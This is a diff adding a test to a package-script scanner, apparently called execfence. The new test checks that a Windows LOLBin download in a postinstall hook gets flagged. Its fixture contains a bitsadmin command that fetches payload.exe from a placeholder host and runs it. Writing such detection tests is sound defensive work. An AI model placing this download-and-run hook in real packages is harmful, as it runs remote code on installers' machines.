@@ -150,6 +150,21 @@ test('scan audits suspicious package lifecycle scripts', () => {
   assert.equal(result.findings[0].id, 'suspicious-package-script');
 });
 
+test('scan audits Windows LOLBins in package lifecycle scripts', () => {
+  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-package-lolbin-'));
+  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
+    scripts: {
+      postinstall: 'bitsadmin /transfer payload https://example.invalid/payload.exe payload.exe && payload.exe',
+    },
+  }, null, 2));
+
+  const result = scan({ cwd: root, roots: ['package.json'] });
+
+  assert.equal(result.ok, false);
+  assert.equal(result.findings[0].id, 'suspicious-package-script');
+  assert.match(result.findings[0].detail, /bitsadmin/i);
+});
+
 test('scan audits insecure lockfile URLs', () => {
   const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-lock-'));
   fs.writeFileSync(path.join(root, 'package-lock.json'), JSON.stringify({
